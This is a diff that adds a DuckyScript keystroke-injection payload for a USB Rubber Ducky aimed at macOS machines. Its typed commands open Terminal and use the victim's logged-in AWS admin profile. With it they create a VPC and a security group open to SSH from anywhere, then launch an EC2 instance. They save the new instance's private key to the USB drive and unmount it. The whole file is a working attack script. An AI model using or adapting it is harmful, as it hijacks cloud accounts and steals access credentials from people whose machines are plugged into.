@@ -1,0 +1,43 @@
+REM Author: Domenico Malorni (lilloX)
+REM spin up an EC2 instance on AWS account
+REM Name: aws.txt
+DELAY 1000
+COMMAND SPACE
+DELAY 800
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 500
+ENTER
+STRING while true; do
+ENTER
+STRING mount | grep "on /Volumes/DUCKY" > /dev/null
+ENTER
+STRING if [ $? -eq 0 ]; then break; fi
+ENTER
+STRING done
+ENTER
+DELAY 500
+STRING touch /Volumes/DUCKY/awskey
+STRING export AWS_PROFILE=devinfosec@admin
+ENTER
+DELAY 500
+STRING aws --region ca-central-1 ec2 create-default-vpc
+ENTER
+DELAY 500
+STRING aws --region ca-central-1  ec2 create-security-group --group-name EC2SecurityGroup --description "Security Group for EC2 instances to allow port 22"
+ENTER
+DELAY 500
+STRING aws --region ca-central-1 ec2 authorize-security-group-ingress --group-name EC2SecurityGroup --protocol tcp --port 22 --cidr 0.0.0.0/0
+ENTER
+DELAY 500
+STRING aws --region ca-central-1  ec2 describe-security-groups --group-names EC2SecurityGroup
+ENTER
+STRING aws --region ca-central-1 ec2 create-key-pair --key-name MyKey > /Volumes/DUCKY/awskey
+ENTER
+DELAY 1000
+STRING aws --region ca-central-1 ec2 run-instances   --image-id ami-01b60a3259250381b  --key-name MyKey --security-groups EC2SecurityGroup --instance-type t2.micro  --block-device-mappings DeviceName=/dev/sdh,Ebs={VolumeSize=100}
+ENTER
+DELAY 500
+STRING diskutil unmount /Volumes/DUCKY
+ENTER
